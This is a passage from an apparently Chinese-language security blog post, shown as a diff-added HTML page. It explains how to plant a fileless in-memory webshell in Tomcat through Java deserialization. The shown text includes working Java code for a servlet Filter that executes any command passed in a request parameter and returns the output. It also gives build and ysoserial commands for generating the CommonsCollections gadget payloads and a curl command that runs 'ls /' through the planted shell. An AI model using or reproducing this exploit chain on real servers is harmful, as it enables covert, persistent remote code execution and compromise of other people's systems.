+        FilterChain filterChain) throws IOException, ServletException &#123;
+        System.out.println(
+            &quot;TomcatShellInject doFilter.....................................................................&quot;);
+        String cmd;
+        if ((cmd = servletRequest.getParameter(&quot;threedr3am&quot;)) != null) &#123;
+            Process process = Runtime.getRuntime().exec(cmd);
+            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
+                new java.io.InputStreamReader(process.getInputStream()));
+            StringBuilder stringBuilder = new StringBuilder();
+            String line;
+            while ((line = bufferedReader.readLine()) != null) &#123;
+                stringBuilder.append(line + &#39;\n&#39;);
+            &#125;
+            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+            servletResponse.getOutputStream().flush();
+            servletResponse.getOutputStream().close();
+            return;
+        &#125;
+        filterChain.doFilter(servletRequest, servletResponse);
+    &#125;
+
+    @Override
+    public void destroy() &#123;
+
+    &#125;
+&#125;
+</code></pre>
+<p>和第一个步骤创建的TomcatEchoInject不一样，这里我们不但基础了AbstractTranslet，还实现了Filter创建一个我们自定义的内存Webshell</p>
+<p>最后，我们也按照第一个步骤那样，创建一个ysoserial的<code>CommonsCollections11</code>类的拷贝，名叫<code>CommonsCollections11ForTomcatShellInject</code>，并把其<code>Gadgets.createTemplatesImpl(command[0])</code>的调用改成<code>Gadgets.createTemplatesImpl(null, TomcatShellInject.class)</code>，这样，我们的Webshell<br>payload就完成了。</p>
+<p>通过执行maven打包</p>
+<pre><code>mvn clean -Dmaven.test.skip=true compile assembly:assembly
+</code></pre>
+<p>然后执行生成的jar</p>
+<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11ForTomcatShellInject &gt; ~/tmp/TomcatEchoInject.ysoserial
+</code></pre>
+<p>就生成了CommonsCollections11ForTomcatShellInject的payload了</p>
+<h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>上一节中，我们生成了两个payload，接下来，我们启动一个具有<code>commons-collections:commons-collections:3.2.1</code>依赖的服务端，并且存在反序列化的接口。</p>
+<p>然后我们把步骤一和步骤二生成的payload依次打过去</p>
+<p><img src="/resource/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/media/rId27.png"></p>
+<p><img src="/resource/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/media/rId28.png"></p>
+<p>可以依次看到，两个步骤都返回500异常，相关信息证明已经执行反序列化成功了，接下来我们试试这个内存Webshell</p>
+<p><img src="/resource/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/media/rId29.png"></p>
+<p><img src="/resource/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/media/rId30.png"></p>
+<p>完美，具体ysoserial改造后的代码，我已经上传到github，有兴趣可以看看<br><a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/ysoserial">ianxtianxt/ysoserial</a></p>
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><blockquote>
+<p>Tomcat通杀回显-内存webshell</p>
+<p>例：</p>
+</blockquote>
+<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar
+CommonsCollections11ForTomcatEchoInject &gt; echo.payload
+</code></pre>
+<blockquote>
+<p>然后使用上述得到的恶意序列化数据echo.payload攻击一遍，然后再继续下面的操作</p>
+</blockquote>
+<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar
+CommonsCollections11ForTomcatShellInject &gt; shell.payload
+</code></pre>
+<blockquote>
+<p>使用恶意序列化数据shell.payload再攻击一遍，可以得到一个内存级的webshell，任意路径，参数threedram为命令</p>
+</blockquote>
+<pre><code>curl http://127.0.0.1:8080/aaa\?threedr3am\=ls%20/
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7388/#toc-3">https://xz.aliyun.com/t/7388\#toc-3</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Tomcat/%E5%9F%BA%E4%BA%8ETomcat%E7%9A%84%E5%86%85%E5%AD%98Webshell%20%E6%97%A0%E6%96%87%E4%BB%B6%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/" data-id="cl5c2qwzk00jfy8v1fntodakz" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Tomcat/%E9%80%9A%E8%BF%87jmx%E6%94%BB%E5%87%BBTomcat/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Tomcat/Tomcat%E6%A0%B7%E4%BE%8B%E7%9B%AE%E5%BD%95session%E6%93%8D%E7%BA%B5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
